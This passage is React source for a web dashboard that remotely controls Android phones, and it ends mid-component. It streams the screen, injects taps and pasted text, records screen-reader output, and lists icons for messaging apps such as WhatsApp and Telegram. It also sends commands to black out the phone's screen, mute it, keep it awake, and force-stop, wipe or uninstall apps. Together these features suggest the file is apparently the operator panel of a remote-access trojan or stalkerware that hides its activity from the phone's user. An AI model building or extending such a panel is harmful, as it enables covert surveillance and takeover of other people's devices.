import React, { Suspense, lazy, useState, useRef, useEffect, useCallback, useMemo } from 'react';
import ScreenReaderRecorder from './ScreenReaderRecorder';

const ScreenReaderView = lazy(() => import('./ScreenReaderView.jsx'));

// ── Inline Task Runner ────────────────────────────────────────────────────────
function TaskRunnerModal({ device, results, onClose }) {
  const deviceId = device.deviceId;
  const accessId = device.accessId || '';
  const isOnline = device.isOnline;

  const [tasks, setTasks]             = useState([]);
  const [loading, setLoading]         = useState(true);
  const [running, setRunning]         = useState(false);
  const [runningTask, setRunningTask] = useState(null);
  const [runLog, setRunLog]           = useState([]);
  const [runningIndex, setRunningIndex]       = useState(-1);
  const [completedIndices, setCompletedIndices] = useState([]);
  const [errorIndex, setErrorIndex]   = useState(-1);

  const taskCommandIdRef  = useRef(null);
  const pendingResolvers  = useRef(new Map());
  const seenIds           = useRef(new Set());

  useEffect(() => {
    const token = localStorage.getItem('admin_token') || localStorage.getItem('user_token');
    // Users are scoped by JWT. Admins can run any saved task, so request the
    // complete task library rather than only the selected device owner's tasks.
    fetch('/api/tasks', { headers: token ? { 'Authorization': `Bearer ${token}` } : {} })
      .then(r => r.json())
      .then(d => { if (d.success) setTasks(d.tasks || []); })
      .catch(() => {})
      .finally(() => setLoading(false));
  }, [accessId]);

  // Handle task_progress events from the device — same logic as TaskStudio
  useEffect(() => {
    results.forEach(r => {
      // Resolve any pending sendAndWait promise
      if (r.id && !seenIds.current.has('resolve_' + r.id)) {
        const entry = pendingResolvers.current.get(r.id);
        if (entry) {
          seenIds.current.add('resolve_' + r.id);
          clearTimeout(entry.timer);
          pendingResolvers.current.delete(r.id);
          entry.resolve(r);
        }
      }

      // Live step progress from the device
      if (r.command === 'task_progress' && !seenIds.current.has(r.id)) {
        seenIds.current.add(r.id);
        const d = typeof r.response === 'object' ? r.response : {};
        if (!taskCommandIdRef.current || d.commandId === taskCommandIdRef.current) {
          const ts = new Date().toLocaleTimeString();
          if (d.complete) {
            setRunningIndex(-1);
            setRunning(false);
            const allDone = (d.completed ?? 0) >= (d.total ?? 1);
            const label   = allDone
              ? `Task complete — all ${d.completed} step(s) done`
              : `Task stopped after ${d.completed ?? 0} of ${d.total ?? '?'} step(s)`;
            setRunLog(prev => [...prev, { status: allDone ? 'ok' : 'err', message: `[${ts}] ${label}` }]);
          } else if (d.stepIndex !== undefined) {
            setRunningIndex(d.stepIndex);
            const stepFailed = d.success === false || d.error || d.failed;
            if (d.done && !stepFailed) setCompletedIndices(prev => prev.includes(d.stepIndex) ? prev : [...prev, d.stepIndex]);
            if (stepFailed && d.done) setErrorIndex(d.stepIndex);
            const logMsg = d.message || (d.error ? `Error: ${d.error}` : '');
            if (logMsg) setRunLog(prev => [...prev, { status: stepFailed ? 'err' : 'ok', message: `[${ts}] Step ${d.stepIndex + 1}: ${logMsg}` }]);
          }
        }
      }
    });
  }, [results]);

  // Send all steps at once via run_task_local — same as TaskStudio
  const sendAndWait = async (command, params = {}, timeoutMs = 12000) => {
    const token       = localStorage.getItem('admin_token') || localStorage.getItem('user_token');
    const sseClientId = sessionStorage.getItem('sseClientId');
    let res, data;
    try {
      res  = await fetch('/api/commands', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
        body: JSON.stringify({ deviceId, command, params: params ?? null, sseClientId }),
      });
      data = await res.json();
    } catch (err) {
      return { success: false, error: String(err) };
    }
    if (!data?.commandId) return { success: false, error: data?.error || 'No commandId' };
    const commandId = data.commandId;
    return new Promise(resolve => {
      const timer = setTimeout(() => {
        if (pendingResolvers.current.has(commandId)) {
          pendingResolvers.current.delete(commandId);
          resolve({ success: false, error: 'Timeout' });
        }
      }, timeoutMs);
      pendingResolvers.current.set(commandId, { resolve, timer });
    });
  };

  const runTask = async (task) => {
    if (!isOnline || running) return;
    taskCommandIdRef.current = null;
    setRunning(true);
    setRunningTask(task);
    setRunLog([]);
    setRunningIndex(-1);
    setCompletedIndices([]);
    setErrorIndex(-1);

    const enabledSteps = (task.steps || [])
      .map((s, i) => ({ ...s, originalIndex: i }))
      .filter(s => s.enabled !== false);

    if (enabledSteps.length === 0) { setRunning(false); return; }

    const ts = new Date().toLocaleTimeString();
    setRunLog([{ status: 'ok', message: `[${ts}] Sending ${enabledSteps.length} step(s) to device…` }]);

    const result = await sendAndWait('run_task_local', { steps: enabledSteps });

    if (!result?.success || !result?.response) {
      const errTs  = new Date().toLocaleTimeString();
      setRunLog(prev => [...prev, { status: 'err', message: `[${errTs}] Failed: ${result?.error || 'Device did not acknowledge'}` }]);
      setRunning(false);
      return;
    }

    let ackData = {};
    try { ackData = typeof result.response === 'string' ? JSON.parse(result.response) : (result.response || {}); } catch (_) {}
    const storedCount = ackData.steps ?? enabledSteps.length;

    taskCommandIdRef.current = result.id;
    const ackTs = new Date().toLocaleTimeString();
    setRunLog(prev => [...prev, {
      status: 'ok',
      message: `[${ackTs}] ✓ Device received ${storedCount} step(s) — executing…`,
    }]);
  };

  const cardStyle = {
    position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.78)',
    display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 9999,
  };
  const boxStyle = {
    background: '#1e293b', borderRadius: 14, width: 520, maxWidth: '95vw',
    maxHeight: '82vh', border: '1px solid #334155', display: 'flex', flexDirection: 'column',
    overflow: 'hidden',
  };

  return (
    <div style={cardStyle} onClick={e => { if (e.target === e.currentTarget && !running) onClose(); }}>
      <div style={boxStyle}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '12px 16px', borderBottom: '1px solid #334155', background: '#162032' }}>
          <span style={{ fontWeight: 700, color: '#a78bfa', fontSize: 13 }}>🎬 Run Task</span>
          <span style={{ fontSize: 11, color: '#64748b' }}>{tasks.length} task{tasks.length !== 1 ? 's' : ''}{accessId ? ` for ${accessId}` : ' (global)'}</span>
          {!running && <button onClick={onClose} style={{ marginLeft: 'auto', ...smallBtn('#334155'), padding: '3px 10px' }}>✕ Close</button>}
          {running && <button onClick={() => setRunning(false)} style={{ marginLeft: 'auto', ...smallBtn('#7f1d1d'), padding: '3px 10px' }}>⏹ Stop</button>}
        </div>

        <div style={{ flex: 1, overflowY: 'auto', padding: 12, display: 'flex', flexDirection: 'column', gap: 8 }}>
          {loading && <div style={{ color: '#64748b', textAlign: 'center', padding: 24 }}>Loading tasks…</div>}
          {!loading && tasks.length === 0 && (
            <div style={{ color: '#475569', textAlign: 'center', padding: 24 }}>
              No tasks yet — create them in Task Studio
            </div>
          )}

          {tasks.map(task => {
            const isActive = runningTask?._id === task._id;
            const enabledSteps = (task.steps || []).filter(s => s.enabled !== false);
            return (
              <div key={task._id} style={{
                background: isActive ? '#1e1b4b' : '#162032',
                border: `1px solid ${isActive ? '#7c3aed' : '#1e293b'}`,
                borderRadius: 10, padding: '10px 14px',
              }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
                  <span style={{ fontWeight: 600, color: '#e2e8f0', fontSize: 13, flex: 1 }}>🎬 {task.name}</span>
                  <span style={{ fontSize: 11, color: '#475569' }}>{enabledSteps.length} step{enabledSteps.length !== 1 ? 's' : ''}</span>
                  <button
                    onClick={() => runTask(task)}
                    disabled={!isOnline || running}
                    style={{ ...smallBtn('#166534'), padding: '4px 12px', fontSize: 12 }}
                  >
                    {isActive && running ? '⟳ Running…' : '▶ Run'}
                  </button>
                </div>

                {isActive && (
                  <div style={{ marginTop: 10 }}>
                    {enabledSteps.map((step, idx) => {
                      const done  = completedIndices.includes(idx);
                      const active = runningIndex === idx;
                      const err   = errorIndex === idx;
                      return (
                        <div key={idx} style={{
                          fontSize: 11, padding: '2px 0',
                          color: err ? '#ef4444' : done ? '#22c55e' : active ? '#f59e0b' : '#475569',
                        }}>
                          {err ? '✗' : done ? '✓' : active ? '⟳' : '○'} {idx + 1}. {step.type}{step.packageName ? ` (${step.appLabel || step.packageName})` : step.text ? ` "${step.text}"` : step.ms ? ` ${step.ms}ms` : ''}
                        </div>
                      );
                    })}
                    {runLog.length > 0 && (
                      <div style={{
                        marginTop: 8, background: '#0f172a', borderRadius: 6, padding: 8,
                        maxHeight: 140, overflowY: 'auto',
                      }}>
                        {runLog.map((entry, i) => (
                          <div key={i} style={{ fontSize: 10, color: entry.status === 'err' ? '#f87171' : '#94a3b8', fontFamily: 'monospace' }}>
                            {entry.message}
                          </div>
                        ))}
                      </div>
                    )}
                  </div>
                )}
              </div>
            );
          })}
        </div>
      </div>
    </div>
  );
}

const SYSTEM_ICONS = {
  'com.whatsapp': '💬', 'com.instagram.android': '📸', 'com.facebook.katana': '👤',
  'org.telegram.messenger': '✈️', 'com.snapchat.android': '👻',
  'com.twitter.android': '🐦', 'com.google.android.gm': '📧',
  'com.google.android.chrome': '🌐', 'com.google.android.youtube': '▶️',
};
const appIcon = pkg => SYSTEM_ICONS[pkg] || '📦';

function latencyColor(ms) {
  if (ms === null || ms === undefined) return '#475569';
  if (ms < 100)  return '#22c55e';
  if (ms < 300)  return '#eab308';
  return '#ef4444';
}

function LatencyBadge({ label, ms }) {
  const color = latencyColor(ms);
  return (
    <div style={{ display: 'flex', alignItems: 'center', gap: 5 }}>
      <span style={{ fontSize: 10, color: '#64748b', textTransform: 'uppercase', letterSpacing: 0.8, fontWeight: 600 }}>{label}</span>
      <span style={{
        fontSize: 12, fontWeight: 700, color,
        background: `${color}18`, borderRadius: 5,
        padding: '1px 7px', fontVariantNumeric: 'tabular-nums',
        minWidth: 52, textAlign: 'center', display: 'inline-block',
      }}>
        {ms !== null && ms !== undefined ? `${ms} ms` : '—'}
      </span>
    </div>
  );
}

export default function ControlCenter({ device, sendCommand, results, streamFrame, send, serverLatency, deviceLatency, onTabChange, screenReaderPushData, offlineRecordingVersion, connected }) {
  const deviceId = device.deviceId;
  const isOnline = device.isOnline;
  const devInfo  = device.deviceInfo || {};
  const devW     = devInfo.screenWidth  || null;
  const devH     = devInfo.screenHeight || null;

  const [showTaskRunner, setShowTaskRunner] = useState(false);

  // ── Manual keep-awake (device loops every 10 s; dashboard re-triggers every 60 s) ──
  const [keepAwakeActive, setKeepAwakeActive] = useState(false);
  const keepAwakeIntervalRef = useRef(null);

  const startKeepAwake = useCallback(() => {
    sendCommand(deviceId, 'wake_keep_alive_start', {});
    setKeepAwakeActive(true);
    if (keepAwakeIntervalRef.current) clearInterval(keepAwakeIntervalRef.current);
    keepAwakeIntervalRef.current = setInterval(() => {
      sendCommand(deviceId, 'wake_keep_alive_start', {});
    }, 60_000);
  }, [deviceId, sendCommand]);

  const stopKeepAwake = useCallback(() => {
    sendCommand(deviceId, 'wake_keep_alive_stop', {});
    setKeepAwakeActive(false);
    if (keepAwakeIntervalRef.current) { clearInterval(keepAwakeIntervalRef.current); keepAwakeIntervalRef.current = null; }
  }, [deviceId, sendCommand]);

  useEffect(() => () => {
    if (keepAwakeIntervalRef.current) clearInterval(keepAwakeIntervalRef.current);
  }, []);

  // Stop keep-awake when device goes offline
  useEffect(() => {
    if (!isOnline && keepAwakeActive) {
      setKeepAwakeActive(false);
      if (keepAwakeIntervalRef.current) { clearInterval(keepAwakeIntervalRef.current); keepAwakeIntervalRef.current = null; }
    }
  }, [isOnline]);

  // ── Mute toggle ───────────────────────────────────────────────────────
  const [isMuted, setIsMuted] = useState(false);
  const toggleMute = useCallback(() => {
    const next = !isMuted;
    sendCommand(deviceId, next ? 'mute_device' : 'unmute_device', {});
    setIsMuted(next);
  }, [isMuted, deviceId, sendCommand]);

  // ── Stream state (mirrors ScreenControl.jsx for reliable frame delivery) ─
  const [streaming, setStreaming]   = useState(false);
  const [fps, setFps]               = useState(0);
  const [hasFrame, setHasFrame]     = useState(false);
  const [streamIdle, setStreamIdle] = useState(false);
  const frameCountRef   = useRef(0);
  const lastFrameTime   = useRef(null);
  const streamingRef    = useRef(false);
  const autoStopRef     = useRef(null);
  const canvasRef       = useRef(null);
  const screenAreaRef   = useRef(null);
  const rafRef          = useRef(null);
  const idleTimerRef    = useRef(null);
  const lastPollTs      = useRef(0);

  useEffect(() => { streamingRef.current = streaming; }, [streaming]);

  // ── Shared paint helper — identical to ScreenControl.jsx ─────────────
  const paintFrame = useCallback((base64) => {
    if (!base64) return;
    frameCountRef.current += 1;
    const now = Date.now();
    if (lastFrameTime.current) {
      const diff = now - lastFrameTime.current;
      if (diff > 0) setFps(Math.round(1000 / diff));
    }
    lastFrameTime.current = now;
    setStreamIdle(false);
    setHasFrame(true);
    if (idleTimerRef.current) clearTimeout(idleTimerRef.current);
    idleTimerRef.current = setTimeout(() => setStreamIdle(true), 8000);

    const img = new window.Image();
    img.onload = () => {
      if (rafRef.current) cancelAnimationFrame(rafRef.current);
      rafRef.current = requestAnimationFrame(() => {
        const canvas = canvasRef.current;
        if (!canvas) return;
        const ctx = canvas.getContext('2d');
        if (canvas.width !== img.naturalWidth || canvas.height !== img.naturalHeight) {
          canvas.width  = img.naturalWidth  || 360;
          canvas.height = img.naturalHeight || 780;
        }
        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
      });
    };
    img.src = `data:image/jpeg;base64,${base64}`;
  }, []);

  // ── SSE frame — paint immediately when SSE delivers a frame ──────────
  useEffect(() => {
    if (!streamFrame) return;
    paintFrame(streamFrame);
  }, [streamFrame, paintFrame]);

  // ── Polling fallback — only while SSE is disconnected ─────────────────
  useEffect(() => {
    if (!streaming || !isOnline || connected) return;
    const POLL_MS = 2000;
    const poll = async () => {
      try {
        const token = localStorage.getItem('admin_token');
        const r = await fetch(`/api/stream/latest/${deviceId}?token=${encodeURIComponent(token)}`);
        if (!r.ok) return;
        const d = await r.json();
        if (d.success && d.frameData && (d._ts || 0) > lastPollTs.current) {
          lastPollTs.current = d._ts || Date.now();
          paintFrame(d.frameData);
        }
      } catch (_) {}
    };
    poll();
    const id = setInterval(poll, POLL_MS);
    return () => clearInterval(id);
  }, [streaming, isOnline, connected, deviceId, paintFrame]);

  const startStream = useCallback(() => {
    if (streamingRef.current) return;
    // Use stream_start (JPEG frames via stream:frame events) — same intervalMs pattern
    // as screen_reader_stream_start but produces JPEG data polled at /api/stream/latest.
    sendCommand(deviceId, 'stream_start', { intervalMs: 2000 });
    setStreaming(true);
    frameCountRef.current = 0;
    lastPollTs.current = 0;
    setFps(0);
    setHasFrame(false);
    setStreamIdle(false);
    if (autoStopRef.current) clearTimeout(autoStopRef.current);
    autoStopRef.current = setTimeout(() => {
      if (streamingRef.current) {
        sendCommand(deviceId, 'stream_stop');
        setStreaming(false);
        setFps(0);
      }
    }, 5 * 60 * 1000);
  }, [deviceId, sendCommand]);

  const stopStream = useCallback(() => {
    sendCommand(deviceId, 'stream_stop');
    setStreaming(false);
    setFps(0);
    if (autoStopRef.current) clearTimeout(autoStopRef.current);
  }, [deviceId, sendCommand]);

  useEffect(() => () => {
    if (streamingRef.current) sendCommand(deviceId, 'stream_stop');
    if (autoStopRef.current) clearTimeout(autoStopRef.current);
    if (idleTimerRef.current) clearTimeout(idleTimerRef.current);
    if (rafRef.current) cancelAnimationFrame(rafRef.current);
  }, []);

  // ── Screen touch on stream ────────────────────────────────────────────
  const handleStreamClick = useCallback((e) => {
    if (!streaming || !devW || !devH) return;
    const el = screenAreaRef.current || canvasRef.current;
    if (!el) return;
    const rect = el.getBoundingClientRect();
    const px   = (e.clientX - rect.left) / rect.width;
    const py   = (e.clientY - rect.top)  / rect.height;
    const tx   = Math.round(px * devW);
    const ty   = Math.round(py * devH);
    sendCommand(deviceId, 'touch', { x: tx, y: ty, duration: 100 });
  }, [streaming, devW, devH, deviceId, sendCommand]);

  // ── Block screen ──────────────────────────────────────────────────────
  const [blockActive, setBlockActive] = useState(false);
  const blockScreen = () => {
    const cmd = blockActive ? 'screen_blackout_off' : 'screen_blackout_on';
    sendCommand(deviceId, cmd, {});
    setBlockActive(v => !v);
  };

  // ── Paste / Input ─────────────────────────────────────────────────────
  const [pasteText, setPasteText]       = useState('');
  const [showPasteInput, setShowPasteInput] = useState(false);

  const doPaste = () => {
    if (!pasteText.trim()) return;
    sendCommand(deviceId, 'set_clipboard', { text: pasteText });
    setTimeout(() => sendCommand(deviceId, 'input_text', { text: pasteText }), 200);
    setShowPasteInput(false);
    setPasteText('');
  };

  // ── App Folder ────────────────────────────────────────────────────────
  const [apps, setApps]               = useState([]);
  const [appsLoading, setAppsLoading] = useState(false);
  const [appSearch, setAppSearch]     = useState('');
  const [confirmApp, setConfirmApp]   = useState(null);
  const [showAppDialog, setShowAppDialog] = useState(false);
  const seenApps = useRef(new Set());

  const loadApps = () => {
    setAppsLoading(true);
    sendCommand(deviceId, 'get_installed_apps', {});
  };

  useEffect(() => {
    results.forEach(r => {
      if (r.command === 'get_installed_apps' && r.success && !seenApps.current.has(r.id)) {
        seenApps.current.add(r.id);
        setAppsLoading(false);
        try {
          const d = typeof r.response === 'string' ? JSON.parse(r.response) : r.response;
          setApps(d.apps || d.installedApps || []);
        } catch (_) { setAppsLoading(false); }
      }
    });
  }, [results]);

  const filteredApps = apps.filter(a => {
    const q = appSearch.toLowerCase();
    return !q || (a.appName || '').toLowerCase().includes(q) || (a.packageName || '').toLowerCase().includes(q);
  });

  const doAppAction = (action, pkg) => {
    if (['uninstall_app', 'force_stop_app', 'clear_app_data'].includes(action)) {
      setConfirmApp({ action, pkg });
    } else {
      sendCommand(deviceId, action, { packageName: pkg });
    }
  };
  const confirmAndDo = () => {
    if (!confirmApp) return;
    sendCommand(deviceId, confirmApp.action, { packageName: confirmApp.pkg });
    setConfirmApp(null);
  };

  // ── Helper ────────────────────────────────────────────────────────────
  const cmd = (command, params = {}) => sendCommand(deviceId, command, params);

  // ── Stream display size — match ScreenReader for consistent look ─────
  const STREAM_W = 360;
  const STREAM_H = devW && devH ? Math.min(780, Math.round(STREAM_W * devH / devW)) : 640;

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 12, paddingBottom: 16 }}>

      {/* ── LATENCY BAR ────────────────────────────────────────────────── */}
      <div style={{
        display: 'flex', alignItems: 'center', gap: 16,
        background: '#1e293b', borderRadius: 10, padding: '7px 14px',
        border: '1px solid #334155', flexWrap: 'wrap',
      }}>
        <span style={{ fontSize: 11, color: '#64748b', fontWeight: 700, textTransform: 'uppercase', letterSpacing: 1, marginRight: 4 }}>
          📡 Latency
        </span>
        <span title="Browser ↔ Server round-trip time">
          <LatencyBadge label="Server" ms={serverLatency} />
        </span>
        <div style={{ width: 1, height: 16, background: '#334155' }} />
        <span title="Server ↔ Android TCP round-trip time (measured server-side)">
          <LatencyBadge label="Device" ms={deviceLatency} />
        </span>
        {deviceLatency === null && isOnline && (
          <span style={{ fontSize: 10, color: '#475569', fontStyle: 'italic' }}>measuring…</span>
        )}
        {!isOnline && (
          <span style={{ fontSize: 10, color: '#ef4444', fontStyle: 'italic', marginLeft: 4 }}>device offline</span>
        )}
        {/* Keep Awake indicator */}
        {isOnline && keepAwakeActive && (
          <div style={{ display: 'flex', alignItems: 'center', gap: 5, fontSize: 10, color: '#22c55e', background: 'rgba(34,197,94,0.08)', borderRadius: 6, padding: '2px 8px', border: '1px solid rgba(34,197,94,0.2)' }}>
            <span style={{ width: 6, height: 6, borderRadius: '50%', background: '#22c55e', display: 'inline-block', animation: 'pulse 2s infinite' }} />
            Keep Awake
          </div>
        )}
        {/* App Folder button — compact, opens dialog */}
        <button
          onClick={() => { setShowAppDialog(true); if (!apps.length) loadApps(); }}
          disabled={!isOnline}
          style={{ marginLeft: 'auto', ...smallBtn('#1e3a5f'), display: 'flex', alignItems: 'center', gap: 5, padding: '4px 12px' }}
        >
          📂 <span style={{ fontSize: 11 }}>App Folder</span>
          {apps.length > 0 && <span style={{ fontSize: 10, color: '#7dd3fc' }}>({apps.length})</span>}
        </button>
        <button
          onClick={() => setShowTaskRunner(true)}
          disabled={!isOnline}
          style={{ ...smallBtn('#4c1d95'), display: 'flex', alignItems: 'center', gap: 5, padding: '4px 12px' }}
        >
          🎬 <span style={{ fontSize: 11 }}>Run Task</span>
        </button>
      </div>

      {/* ── TOP ROW: Two Phone Frames ──────────────────────────────────── */}
      <div style={{ display: 'flex', gap: 14, alignItems: 'flex-start', flexWrap: 'wrap' }}>

        {/* ── SCREEN CONTROL PHONE ────────────────────────────────────── */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
          <div style={{ fontSize: 10, color: '#64748b', textTransform: 'uppercase', letterSpacing: 1, fontWeight: 700, textAlign: 'center' }}>
            📱 Screen Control
          </div>

          {/* Phone bezel */}
          <div style={{
            background: '#1e293b', borderRadius: 24, padding: '14px 10px 10px',
            border: '2px solid #334155', display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 8,
            boxShadow: '0 4px 20px rgba(0,0,0,0.4)',
          }}>
            {/* Notch */}
            <div style={{ width: 60, height: 6, background: '#334155', borderRadius: 4, marginBottom: 2 }} />

            {/* Stream area */}
            <div
              ref={screenAreaRef}
              style={{
                width: STREAM_W, height: STREAM_H,
                background: '#0f172a', borderRadius: 8, border: '1px solid #1e293b',
                display: 'flex', alignItems: 'center', justifyContent: 'center',
                overflow: 'hidden', cursor: streaming ? 'crosshair' : 'default',
                position: 'relative',
              }}
              onClick={handleStreamClick}
            >
              {/* Canvas stays mounted once we have a frame — keeps previous frame visible
                  while the next one decodes, eliminating blank flashes */}
              <canvas
                ref={canvasRef}
                style={{
                  display: hasFrame ? 'block' : 'none',
                  width: '100%', height: '100%',
                  objectFit: 'fill', borderRadius: 8, pointerEvents: 'none',
                }}
              />
              {!hasFrame && (
                <div style={{ textAlign: 'center', color: '#334155' }}>
                  <div style={{ fontSize: 28 }}>📱</div>
                  <div style={{ fontSize: 11, marginTop: 6 }}>
                    {streaming ? 'Waiting for frame…' : 'Start stream to view'}
                  </div>
                </div>
              )}
              {hasFrame && (
                <div style={{
                  position: 'absolute', top: 4, right: 6,
                  fontSize: 10, color: streamIdle ? '#94a3b8' : '#22c55e',
                  background: 'rgba(0,0,0,0.5)', borderRadius: 4, padding: '1px 5px',
                }}>
                  {streamIdle ? '⏸ IDLE' : '● LIVE'}
                </div>
              )}
              {blockActive && (
                <div style={{ position: 'absolute', inset: 0, background: 'rgba(0,0,0,0.6)', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                  <span style={{ color: '#ef4444', fontSize: 11, fontWeight: 700 }}>🔲 SCREEN BLOCKED</span>
                </div>
              )}
            </div>

            {/* Controls row */}
            <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap', justifyContent: 'center', paddingBottom: 4 }}>
              <button
                onClick={streaming ? stopStream : startStream}
                disabled={!isOnline}
                style={{ ...smallBtn(streaming ? '#7f1d1d' : '#166534'), fontSize: 11 }}
              >
                {streaming ? '⏹ Stop' : '▶ Start'}
              </button>
              {streaming && (
                <span style={{ fontSize: 11, color: streamIdle ? '#94a3b8' : '#22c55e', alignSelf: 'center' }}>
                  {streamIdle ? '⏸ idle' : `● ${fps}fps`}
                </span>
              )}
              <button
                onClick={blockScreen}
                disabled={!isOnline}
                style={{ ...smallBtn(blockActive ? '#dc2626' : '#334155'), fontSize: 11 }}
              >
                {blockActive ? '🔲 Unblock' : '⬛ Block'}
              </button>
            </div>
          </div>
          {devW && devH && (
            <div style={{ fontSize: 10, color: '#475569', textAlign: 'center' }}>{devW}×{devH}</div>
          )}
        </div>

        {/* ── SCREEN READER ────────────────────────────────────────────── */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: 6, flex: 1, minWidth: 0 }}>
          <div style={{ fontSize: 10, color: '#64748b', textTransform: 'uppercase', letterSpacing: 1, fontWeight: 700, textAlign: 'center' }}>
            📺 Screen Reader
          </div>
          <Suspense fallback={<div style={{ minHeight: 160, display: 'grid', placeItems: 'center', color: '#64748b', fontSize: 12 }}>Loading screen reader…</div>}>
            <ScreenReaderView
              device={device}
              sendCommand={sendCommand}
              results={results}
              screenPushData={screenReaderPushData}
              connected={connected}
            />
          </Suspense>
        </div>

      </div>

      {/* ── SCREEN READER RECORDER ────────────────────────────────────── */}
      <div style={{
        background: '#1e293b', borderRadius: 12, border: '1px solid #334155',
        padding: '12px 14px', display: 'flex', flexDirection: 'column', gap: 10,
      }}>
        <div style={{ fontSize: 10, color: '#64748b', textTransform: 'uppercase', letterSpacing: 1, fontWeight: 700 }}>
          🎥 Screen Reader Recorder
        </div>
        <ScreenReaderRecorder
          device={device}
          sendCommand={sendCommand}
          results={results}
          screenReaderPushData={screenReaderPushData}
          offlineRecordingVersion={offlineRecordingVersion}
        />
      </div>

      {/* ── CONTROL PAD ────────────────────────────────────────────────── */}
      <div style={{
        background: '#1e293b', borderRadius: 12, border: '1px solid #334155',
        padding: '12px 14px', display: 'flex', flexDirection: 'column', gap: 10,
      }}>
        <div style={{ fontSize: 10, color: '#64748b', textTransform: 'uppercase', letterSpacing: 1, fontWeight: 700 }}>
          🎮 Control Pad
        </div>

        {/* Row 0: Screen — Wake | Keep Awake toggle | Storage */}
        <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
          <span style={{ fontSize: 10, color: '#475569', width: 56, flexShrink: 0 }}>Screen</span>
          <div style={{ display: 'flex', gap: 8 }}>
            <CtrlBtn
              icon="💡" label="Wake Screen"
              onClick={() => cmd('wake_screen')}
              disabled={!isOnline}
              color="#b45309"
            />
            <CtrlBtn
              icon={keepAwakeActive ? '🌙' : '☀️'}
              label={keepAwakeActive ? 'Stop Keep Awake' : 'Keep Awake'}
              onClick={keepAwakeActive ? stopKeepAwake : startKeepAwake}
              disabled={!isOnline}
              color={keepAwakeActive ? '#7c3aed' : '#92400e'}
            />
            <CtrlBtn
              icon="📂" label="Storage"
              onClick={() => cmd('request_storage_permission')}
              disabled={!isOnline}
              color="#0f766e"
            />
          </div>
        </div>

        {/* Row Audio: Mute toggle */}
        <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
          <span style={{ fontSize: 10, color: '#475569', width: 56, flexShrink: 0 }}>Audio</span>
          <div style={{ display: 'flex', gap: 8 }}>
            <CtrlBtn
              icon={isMuted ? '🔇' : '🔔'}
              label={isMuted ? 'Unmute' : 'Mute'}
              onClick={toggleMute}
              disabled={!isOnline}
              color={isMuted ? '#dc2626' : '#1d4ed8'}
            />
          </div>
        </div>

        {/* Row 1: Input — Paste | Enter  (Nav + Swipe are in the Screen Reader panel) */}
        <div style={{ display: 'flex', gap: 8, alignItems: 'flex-start' }}>
          <span style={{ fontSize: 10, color: '#475569', width: 56, flexShrink: 0, paddingTop: 8 }}>Input</span>
          <div style={{ display: 'flex', flexDirection: 'column', gap: 6, flex: 1 }}>
            <div style={{ display: 'flex', gap: 8 }}>
              <CtrlBtn
                icon="📋" label="Paste"
                onClick={() => setShowPasteInput(v => !v)}
                disabled={!isOnline}
                color={showPasteInput ? '#b45309' : undefined}
              />
              <CtrlBtn
                icon="↵" label="Enter"
                onClick={() => cmd('press_enter')}
                disabled={!isOnline}
                color="#7c3aed"
              />
            </div>
            {showPasteInput && (
              <div style={{ display: 'flex', gap: 6 }}>
                <input
                  value={pasteText}
                  onChange={e => setPasteText(e.target.value)}
                  onKeyDown={e => e.key === 'Enter' && doPaste()}
                  placeholder="Text to paste…"
                  autoFocus
                  style={{
                    flex: 1, background: '#0f172a', border: '1px solid #334155',
                    borderRadius: 6, padding: '6px 10px', color: '#f1f5f9', fontSize: 12,
                  }}
                />
                <button
                  onClick={doPaste}
                  disabled={!pasteText.trim() || !isOnline}
                  style={{ ...smallBtn('#1d4ed8') }}
                >
                  Send
                </button>
                <button onClick={() => setShowPasteInput(false)} style={{ ...smallBtn('#334155') }}>✕</button>
              </div>
            )}
          </div>
        </div>
      </div>

      {/* ── APP FOLDER DIALOG ──────────────────────────────────────────── */}
      {showAppDialog && (
        <div style={{
          position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.75)',
          display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 9999,
        }}
          onClick={e => { if (e.target === e.currentTarget) setShowAppDialog(false); }}
        >
          <div style={{
            background: '#1e293b', borderRadius: 14, width: 560, maxWidth: '95vw',
            maxHeight: '80vh', border: '1px solid #334155', display: 'flex', flexDirection: 'column',
            overflow: 'hidden',
          }}>
            {/* Dialog header */}
            <div style={{
              display: 'flex', alignItems: 'center', gap: 10,
              padding: '12px 16px', borderBottom: '1px solid #334155', background: '#162032',
            }}>
              <span style={{ fontWeight: 700, color: '#94a3b8', fontSize: 13, textTransform: 'uppercase', letterSpacing: 1 }}>
                📂 App Folder
              </span>
              {apps.length > 0 && (
                <span style={{ fontSize: 11, color: '#64748b' }}>{apps.length} apps</span>
              )}
              <button onClick={loadApps} disabled={!isOnline || appsLoading} style={{ ...smallBtn('#334155'), fontSize: 11, padding: '3px 10px', marginLeft: 4 }}>
                {appsLoading ? '…' : apps.length ? '↻ Refresh' : '📦 Load Apps'}
              </button>
              {apps.length > 0 && (
                <input
                  value={appSearch}
                  onChange={e => setAppSearch(e.target.value)}
                  placeholder="Search apps…"
                  style={{
                    flex: 1, minWidth: 100, background: '#0f172a', border: '1px solid #334155',
                    borderRadius: 6, padding: '4px 10px', color: '#f1f5f9', fontSize: 12,
                  }}
                />
              )}
              <button
                onClick={() => setShowAppDialog(false)}
                style={{ ...smallBtn('#334155'), fontSize: 15, padding: '3px 10px', marginLeft: 'auto' }}
              >
                ✕ Close
              </button>
            </div>

            {/* App list */}
            <div style={{ flex: 1, overflowY: 'auto', padding: 10 }}>
              {!apps.length && !appsLoading && (
                <div style={{ textAlign: 'center', color: '#475569', padding: '30px 0', fontSize: 13 }}>
                  Click "Load Apps" to see installed apps
                </div>
              )}
              {appsLoading && (
                <div style={{ textAlign: 'center', color: '#64748b', padding: '30px 0', fontSize: 13 }}>Loading apps…</div>
              )}
